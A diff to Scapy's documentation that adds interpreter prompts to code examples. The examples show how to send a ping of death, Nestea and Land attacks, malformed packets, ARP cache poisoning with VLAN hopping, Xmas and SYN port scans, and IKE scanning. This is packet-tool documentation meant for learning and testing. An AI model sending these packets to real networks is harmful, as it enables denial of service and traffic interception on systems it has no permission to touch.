@@ -1081,9 +1081,9 @@ Similarly, filtered ports can be found with unanswered packets::
 Xmas Scan
 ---------
 
-Xmas Scan can be launced using the following command:
+Xmas Scan can be launced using the following command::
 
->>> ans,unans = sr(IP(dst="192.168.1.1")/TCP(dport=666,flags="FPU") )
+    >>> ans,unans = sr(IP(dst="192.168.1.1")/TCP(dport=666,flags="FPU") )
 
 Checking RST responses will reveal closed ports on the target. 
 
@@ -1153,21 +1153,21 @@ Classical attacks
 
 Malformed packets::
 
-    send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP()) 
+    >>> send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP()) 
 
 Ping of death (Muuahahah)::
 
-    send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) ) 
+    >>> send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) ) 
 
 Nestea attack::
 
-    send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10)) 
-    send(IP(dst=target, id=42, frag=48)/("X"*116)) 
-    send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224)) 
+    >>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10)) 
+    >>> send(IP(dst=target, id=42, frag=48)/("X"*116)) 
+    >>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224)) 
     
 Land attack (designed for Microsoft Windows)::
 
-    send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
+    >>> send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
 
 ARP cache poisoning   
 ------------------- 
@@ -1176,12 +1176,12 @@ its ARP cache through a VLAN hopping attack.
 
 Classic ARP cache poisoning::
 
-    send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client), 
+    >>> send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client), 
           inter=RandNum(10,40), loop=1 ) 
 
 ARP cache poisoning with double 802.1q encapsulation::
  
-    send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2) 
+    >>> send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2) 
           /ARP(op="who-has", psrc=gateway, pdst=client),
           inter=RandNum(10,40), loop=1 )
 
@@ -1190,14 +1190,14 @@ TCP Port Scanning
  
 Send a TCP SYN on each port. Wait for a SYN-ACK or a RST or an ICMP error:: 
 
-    res,unans = sr( IP(dst="target") 
+    >>> res,unans = sr( IP(dst="target") 
                     /TCP(flags="S", dport=(1,1024)) ) 
 
 Possible result visualization: open ports
 
 ::
 
-    res.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )
+    >>> res.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )
     
     
 IKE Scanning
@@ -1206,14 +1206,14 @@ IKE Scanning
 We try to identify VPN concentrators by sending ISAKMP Security Association proposals
 and receiving the answers::
 
-    res,unans = sr( IP(dst="192.168.1.*")/UDP()
+    >>> res,unans = sr( IP(dst="192.168.1.*")/UDP()
                     /ISAKMP(init_cookie=RandString(8), exch_type="identity prot.") 
                     /ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal()) 
                   ) 
 
 Visualizing the results in a list::
 
-    res.nsummary(prn=lambda (s,r): r.src, lfilter=lambda (s,r): r.haslayer(ISAKMP) ) 
+    >>> res.nsummary(prn=lambda (s,r): r.src, lfilter=lambda (s,r): r.haslayer(ISAKMP) ) 
     
   
 
@@ -1246,12 +1246,12 @@ Tracerouting an UDP application like we do with TCP is not
 reliable, because there's no handshake. We need to give an applicative payload (DNS, ISAKMP, 
 NTP, etc.) to deserve an answer::
 
-    res,unans = sr(IP(dst="target", ttl=(1,20))
+    >>> res,unans = sr(IP(dst="target", ttl=(1,20))
                   /UDP()/DNS(qd=DNSQR(qname="test.com")) 
 
 We can visualize the results as a list of routers::
 
-    res.make_table(lambda (s,r): (s.dst, s.ttl, r.src)) 
+    >>> res.make_table(lambda (s,r): (s.dst, s.ttl, r.src)) 
 
 
 DNS traceroute
